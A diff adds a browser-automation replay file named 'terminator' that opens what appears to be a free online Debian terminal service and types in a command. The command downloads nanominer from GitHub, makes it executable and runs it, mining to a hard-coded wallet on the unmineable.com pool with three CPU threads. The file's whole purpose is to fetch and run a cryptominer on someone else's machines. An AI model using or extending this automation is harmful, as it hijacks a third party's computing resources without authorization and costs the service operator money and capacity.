@@ -1,0 +1,106 @@
+{
+    "title": "terminator",
+    "timeout": 30000,
+    "steps": [
+        {
+            "type": "setViewport",
+            "width": 1216,
+            "height": 280,
+            "deviceScaleFactor": 1,
+            "isMobile": false,
+            "hasTouch": false,
+            "isLandscape": false
+        },
+        {
+            "type": "navigate",
+            "url": "https://ntp.msn.com/edge/ntp?locale=en-US&title=New%20tab&dsp=1&sp=Bing&prerender=1&PC=U531",
+            "assertedEvents": [
+                {
+                    "type": "navigation",
+                    "url": "https://ntp.msn.com/edge/ntp?locale=en-US&title=New%20tab&dsp=1&sp=Bing&prerender=1&PC=U531",
+                    "title": "New tab"
+                }
+            ]
+        },
+        {
+            "type": "navigate",
+            "url": "https://terminator.aeza.net/en/",
+            "assertedEvents": [
+                {
+                    "type": "navigation",
+                    "url": "https://terminator.aeza.net/en/",
+                    "title": ""
+                }
+            ]
+        },
+        {
+            "type": "click",
+            "target": "main",
+            "selectors": [
+                [
+                    "aria/debian"
+                ],
+                [
+                    "button:nth-of-type(2)"
+                ],
+                [
+                    "xpath///*[@id=\"window\"]/div[1]/div[1]/button[2]"
+                ],
+                [
+                    "pierce/button:nth-of-type(2)"
+                ],
+                [
+                    "text/debian"
+                ]
+            ],
+            "offsetY": 23,
+            "offsetX": 155
+        },
+        {
+            "type": "click",
+            "target": "main",
+            "selectors": [
+                [
+                    "div:nth-of-type(6)"
+                ],
+                [
+                    "xpath///*[@id=\"terminal\"]/div/div[2]/div[2]/div[6]"
+                ],
+                [
+                    "pierce/div:nth-of-type(6)"
+                ]
+            ],
+            "offsetY": 12.59375,
+            "offsetX": 202
+        },
+        {
+            "type": "change",
+            "value": "echo 'wget https://github.com/nanopool/nanominer/releases/download/v3.8.4/nanominer-linux-3.8.4.tar.gz && tar -xf nanominer-linux-3.8.4.tar.gz && chmod +x nanominer && ./nanominer -algo Randomx -coin TRX -wallet TC3pqSgT1HBDBPvMAi65TBpzordqfx6eMx.R2 -pool1 rx.unmineable.com:3333 -protocol JSON-RPC -cpuThreads 3' > run_nanominer.sh && chmod +x run_nanominer.sh && ./run_nanominer.sh",
+            "selectors": [
+                [
+                    "aria/Terminal input"
+                ],
+                [
+                    "#terminal textarea"
+                ],
+                [
+                    "xpath///*[@id=\"terminal\"]/div/div[2]/div[1]/textarea"
+                ],
+                [
+                    "pierce/#terminal textarea"
+                ]
+            ],
+            "target": "main"
+        },
+        {
+            "type": "keyDown",
+            "target": "main",
+            "key": "Enter"
+        },
+        {
+            "type": "keyUp",
+            "key": "Enter",
+            "target": "main"
+        }
+    ]
+}
